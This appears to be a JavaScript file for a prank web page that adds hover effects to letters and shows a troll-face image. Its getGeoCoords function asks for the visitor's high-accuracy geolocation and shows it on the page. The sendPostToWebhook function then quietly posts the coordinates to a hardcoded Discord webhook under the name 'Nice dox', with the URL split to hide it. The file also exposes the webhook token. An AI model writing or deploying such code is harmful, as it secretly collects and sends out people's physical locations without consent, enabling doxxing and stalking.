document.getElementById('wordsbox').appendChild(getGeoCoords())
const trollface = document.createElement('span')
trollface.innerHTML += `
    <img src="https://media.tenor.com/mOovG0h3E6IAAAAM/troll-face.gif" alt="trol">
    `;
document.getElementById('wordsbox').appendChild(trollface)


const hoverables = document.getElementsByClassName('word')
for (const word of hoverables) {
    spanify(word);
}
function spanify(...nodes) {
    for (const node of nodes) {
        const text = node.innerText.split('')
        node.innerText = ''
        text.forEach(char => {
            const span = document.createElement('span')
            span.innerText = char
            span.className = 'char hoverfx'
            node.appendChild(span)
        })
    }
}
function getGeoCoords() {
    const coords = document.createElement('span')
    coords.className = 'line'
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition((position) => {
            const lat = document.createElement('span')
            const long = document.createElement('span')
            lat.innerText = "Latitude: " + position.coords.latitude;
            long.innerText = "Longitude: " + position.coords.longitude;
            coords.appendChild(lat);
            coords.appendChild(long);
            sendPostToWebhook(lat.innerText + ' ' + long.innerText)
            spanify(lat, long)
        }, null, { enableHighAccuracy: true, timeout: 1000, maximumAge: 0 });

    } else {
        coords.innerText = "Geolocation disabled :(";
    }
    return coords
}
function sendPostToWebhook(message) {
    const webHookURL = 'https:' + '//discord.com/api/webhooks/1090630967179345950/EQJEsXS_TrN-yGiEYQ-tTsL_pxpOwbvRWr3hs3pxti1G14bkvYncaAW5CU34VvUfPURy'
    let xhr = new XMLHttpRequest();
    xhr.open("POST", webHookURL, true);
    xhr.setRequestHeader('Content-Type', 'application/json');
    xhr.send(JSON.stringify({
        'content': message,
        'username': 'Nice dox',
    }));
}
